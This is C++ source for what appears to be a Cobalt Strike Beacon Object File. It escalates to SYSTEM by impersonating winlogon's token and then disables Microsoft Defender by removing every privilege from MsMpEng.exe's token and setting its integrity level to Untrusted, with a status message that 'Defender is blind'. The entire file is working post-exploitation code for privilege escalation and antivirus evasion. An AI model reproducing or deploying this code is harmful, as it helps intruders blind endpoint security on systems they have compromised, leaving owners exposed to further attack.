#define _WIN32_WINNT 0x06000000 // For Mingw
#include <windows.h>
#include <winternl.h>
#include <tchar.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <conio.h>
#include <winsvc.h>

extern "C" {
	#include "beacon.h"
	void go(char* args, int len);
	//MSVCRT
	WINBASEAPI int __cdecl MSVCRT$_stricmp(const char * string1, const char * string2);
	WINBASEAPI int __cdecl MSVCRT$sprintf(char * string1, const char * format, ...);
	WINBASEAPI int __cdecl MSVCRT$tolower( int c);
	WINBASEAPI char * __cdecl MSVCRT$strstr(char * str, const char * strSearch);

	//KERNEL32
	DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$GetCurrentProcess();
	WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
	DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
	WINBASEAPI BOOL WINAPI KERNEL32$Process32First(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
	WINBASEAPI BOOL WINAPI KERNEL32$Process32Next(HANDLE hSnapshot, LPPROCESSENTRY32 lppe);
	WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
	WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
    WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
    DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalAlloc(UINT, SIZE_T);
    DECLSPEC_IMPORT HLOCAL WINAPI KERNEL32$LocalFree(HLOCAL);

	//ADVAPI32
	WINADVAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
	WINADVAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueA(LPCSTR lpSystemName, LPCSTR lpName, PLUID lpLuid); //LookupPrivilegeValueW? shouldn't matter because first param we always call Null.
	WINADVAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
	WINADVAPI BOOL WINAPI ADVAPI32$ImpersonateLoggedOnUser(HANDLE hToken);
	WINADVAPI BOOL WINAPI ADVAPI32$SetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength);
	WINADVAPI DWORD WINAPI ADVAPI32$GetLengthSid(PSID pSid); //DECLSPEC_IMPORT
	WINADVAPI BOOL WINAPI ADVAPI32$GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer);
    WINADVAPI BOOL WINAPI ADVAPI32$RevertToSelf();
    WINADVAPI PDWORD WINAPI ADVAPI32$GetSidSubAuthority(PSID pSid, DWORD nSubAuthority);
    WINADVAPI PUCHAR WINAPI ADVAPI32$GetSidSubAuthorityCount(PSID pSid);
    WINADVAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, LPVOID TokenInformation, DWORD TokenInformationLength, PDWORD ReturnLength);
	}
//Enable SeDebugPrivilege in primary token
void EnableDebugPrivilege()
{
    HANDLE hToken;
    LUID sedebugnameValue;
    TOKEN_PRIVILEGES tkp;
    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] OpenProcessToken Failed.");
    }
    if (!ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &sedebugnameValue))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] LookupPrivilegeValue.");
        KERNEL32$CloseHandle(hToken);
    }
    tkp.PrivilegeCount = 1;
    tkp.Privileges[0].Luid = sedebugnameValue;
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (!ADVAPI32$AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "[-] AdjustTokenPrivileges Failed.");
    }
    KERNEL32$CloseHandle(hToken);
}
//Get PID of provided process
int getpid(const char * procname)
{
    DWORD procPID = 0;
    char * processName;
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // replace this with Ntquerysystemapi
    HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, procPID);
    if (KERNEL32$Process32First(snapshot, &processEntry))
    {
        while (MSVCRT$_stricmp(processName, procname) != 0)
        {
            KERNEL32$Process32Next(snapshot, &processEntry);
            processName = processEntry.szExeFile;
            procPID = processEntry.th32ProcessID;
        }
        BeaconPrintf(CALLBACK_OUTPUT, "[+] Got %s PID: %d\n", procname, procPID);
    }
    return procPID;
}
//Remove specified privilege from Access token
BOOL SetPrivilege(
    HANDLE hToken,          // access token handle
    LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
    BOOL bEnablePrivilege   // to enable or disable privilege
)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!ADVAPI32$LookupPrivilegeValueA(
        NULL,            // lookup privilege on local system
        lpszPrivilege,   // privilege to lookup 
        &luid))        // receives LUID of privilege
    {
        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValue error");//: %u\n", GetLastError());
        return FALSE;
    }
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    //Define new privilege to set based on bool passed to function.  Both defined the same here since we just want to remove privileges.
    if (bEnablePrivilege)
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;
    else
        tp.Privileges[0].Attributes = SE_PRIVILEGE_REMOVED;

    // Enable the privilege or disable all privileges.
    if (!ADVAPI32$AdjustTokenPrivileges(
        hToken,
        FALSE,
        &tp,
        sizeof(TOKEN_PRIVILEGES),
        (PTOKEN_PRIVILEGES)NULL,
        (PDWORD)NULL))
    {
        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges Error: 0x%lx\n", KERNEL32$GetLastError());
        return FALSE;
    }
    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED)

    {
        BeaconPrintf(CALLBACK_ERROR, "The token does not have the specified privilege. \n");
        return FALSE;
    }
    return TRUE;
}

void go(char* args, int len)
{
    //Retrieve arg from beacon
    datap parser;
    char* action;
    BeaconDataParse(&parser, args, len);
    action = BeaconDataExtract(&parser, NULL);

    //Initialize vars
    HANDLE phandle;
    HANDLE ptoken;
    int pid;
    const char* procname;
    LUID sedebugnameValue;

    //Enable SeDebugPrivilege
    EnableDebugPrivilege();
    
    //Get username
    char username[255];
    DWORD username_len = 255;
    ADVAPI32$GetUserNameA(username, &username_len);

    //convert username to lowercase for consistency accross OS versions
    int i = 0;
    char c;
    while (username[i])
    {
        c = username[i];
        username[i] = (MSVCRT$tolower(c));
        i++;
    }

    //check to see if username contains system
    char* match;
    match = MSVCRT$strstr(username, "system");

    //If we are not system we must escalate to System
    if (match == NULL)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Escalating to System...\n");
	    //Get pid for winlogon process
	    procname = "winlogon.exe";
	    pid = getpid(procname);
	    //Open handle to winlogon
	    phandle = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
	    //Open winlogon process token
	    ADVAPI32$OpenProcessToken(phandle, TOKEN_READ | TOKEN_IMPERSONATE | TOKEN_DUPLICATE, &ptoken);
	    //Impersonate System via winlogon's process token
	    if (ADVAPI32$ImpersonateLoggedOnUser(ptoken)) {

		BeaconPrintf(CALLBACK_OUTPUT, "[*] Impersonated System!\n");
	    }
	    else {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to impersonate System...\n");
	    }
	    KERNEL32$CloseHandle(phandle);
	    KERNEL32$CloseHandle(ptoken);
    }

    //Need to open a handle to Defender and it's token regardless of next action...
    const char* procname2 = "MsMpEng.exe";
    pid = getpid(procname2);

    phandle = KERNEL32$OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (phandle != INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Opened Target Handle\n");
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to open Process Handle\n");
    }
    BOOL token = ADVAPI32$OpenProcessToken(phandle, TOKEN_ALL_ACCESS, &ptoken);
    if (token) {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Opened Target Token Handle\n");
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to open Target Token Handle\n");
    }


    //Kill mode. Set Defender token integrity to untrusted to "kill" it
    if (MSVCRT$_stricmp(action, "kill") == 0)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Killing Defender...\n");

        //Enable SeDebugPrivilege in Defender process
        ADVAPI32$LookupPrivilegeValueA(NULL, SE_DEBUG_NAME, &sedebugnameValue);
        TOKEN_PRIVILEGES tkp;
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Luid = sedebugnameValue;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!ADVAPI32$AdjustTokenPrivileges(ptoken, FALSE, &tkp, sizeof(tkp), NULL, NULL))
        {
            BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to Adjust Token's Privileges\n");
        }

        // Remove all privileges
        SetPrivilege(ptoken, SE_DEBUG_NAME, TRUE);
        SetPrivilege(ptoken, SE_CHANGE_NOTIFY_NAME, TRUE);
        SetPrivilege(ptoken, SE_TCB_NAME, TRUE);
        SetPrivilege(ptoken, SE_IMPERSONATE_NAME, TRUE);
        SetPrivilege(ptoken, SE_LOAD_DRIVER_NAME, TRUE);
        SetPrivilege(ptoken, SE_RESTORE_NAME, TRUE);
        SetPrivilege(ptoken, SE_BACKUP_NAME, TRUE);
        SetPrivilege(ptoken, SE_SECURITY_NAME, TRUE);
        SetPrivilege(ptoken, SE_SYSTEM_ENVIRONMENT_NAME, TRUE);
        SetPrivilege(ptoken, SE_INCREASE_QUOTA_NAME, TRUE);
        SetPrivilege(ptoken, SE_TAKE_OWNERSHIP_NAME, TRUE);
        SetPrivilege(ptoken, SE_INC_BASE_PRIORITY_NAME, TRUE);
        SetPrivilege(ptoken, SE_SHUTDOWN_NAME, TRUE);
        SetPrivilege(ptoken, SE_ASSIGNPRIMARYTOKEN_NAME, TRUE);

        BeaconPrintf(CALLBACK_OUTPUT, "[*] Removed All Privileges\n");

        //Initialize SID structure and pass it the new integrityLevel.
        DWORD integrityLevel = SECURITY_MANDATORY_UNTRUSTED_RID; 
        SID integrityLevelSid{};
        integrityLevelSid.Revision = SID_REVISION;
        integrityLevelSid.SubAuthorityCount = 1;
        integrityLevelSid.IdentifierAuthority.Value[5] = 16;
        integrityLevelSid.SubAuthority[0] = integrityLevel;

        TOKEN_MANDATORY_LABEL tokenIntegrityLevel = {};
        tokenIntegrityLevel.Label.Attributes = SE_GROUP_INTEGRITY;
        tokenIntegrityLevel.Label.Sid = &integrityLevelSid;
        //Modify token to set new integrity level.
        if (!ADVAPI32$SetTokenInformation(
            ptoken,
            TokenIntegrityLevel,
            &tokenIntegrityLevel,
            sizeof(TOKEN_MANDATORY_LABEL) + ADVAPI32$GetLengthSid(&integrityLevelSid)))
        {
            BeaconPrintf(CALLBACK_ERROR, "SetTokenInformation Error: 0x%lx\n", KERNEL32$GetLastError());
        }
        else {

            BeaconPrintf(CALLBACK_OUTPUT, "[*] Token Integrity set to Untrusted. Defender is blind :)\n");
        }
    }
    else if (MSVCRT$_stricmp(action, "check") == 0)
    {
        BeaconPrintf(CALLBACK_OUTPUT, "[*] Enumerating Defender's token...\n");

        //Initialize vars
        DWORD dwLengthNeeded;
        DWORD dwError = ERROR_SUCCESS;
        PTOKEN_MANDATORY_LABEL pTIL = NULL;
        LPWSTR pStringSid;
        DWORD dwIntegrityLevel;

        // Get the Integrity level.
        //First GetTokenInformation will fail, but pass required length for var to dwLengthNeeded
        if (!ADVAPI32$GetTokenInformation(ptoken, TokenIntegrityLevel,
            NULL, 0, &dwLengthNeeded))
        {
            dwError = KERNEL32$GetLastError();
            if (dwError == ERROR_INSUFFICIENT_BUFFER)
            {
                //Allocate enough memory to hold Token integrity information
                pTIL = (PTOKEN_MANDATORY_LABEL)KERNEL32$LocalAlloc(0,
                    dwLengthNeeded);
                if (pTIL != NULL)
                {
                    //Call GetTokenInformation again to get the actual Integrity level
                    if (ADVAPI32$GetTokenInformation(ptoken, TokenIntegrityLevel,
                        pTIL, dwLengthNeeded, &dwLengthNeeded))
                    {
                        //Set dwIntegrityLevel to value of Token's integrity.
                        dwIntegrityLevel = *ADVAPI32$GetSidSubAuthority(pTIL->Label.Sid,
                            (DWORD)(UCHAR)(*ADVAPI32$GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));
                    }
                    //Free memory
                    KERNEL32$LocalFree(pTIL);
                }
            }
        }
        if (dwIntegrityLevel == SECURITY_MANDATORY_UNTRUSTED_RID)
            BeaconPrintf(CALLBACK_OUTPUT, "[*] Defender's token is Untrusted- It is blind!\n");
        else //Otherwise token must still be System.
            BeaconPrintf(CALLBACK_ERROR, "Defender's token is SYSTEM! IT IS STILL ACTIVE!\n");
    }
    //Drop system privileges
    ADVAPI32$RevertToSelf();
    //Close handles
    KERNEL32$CloseHandle(ptoken);
    KERNEL32$CloseHandle(phandle);
}
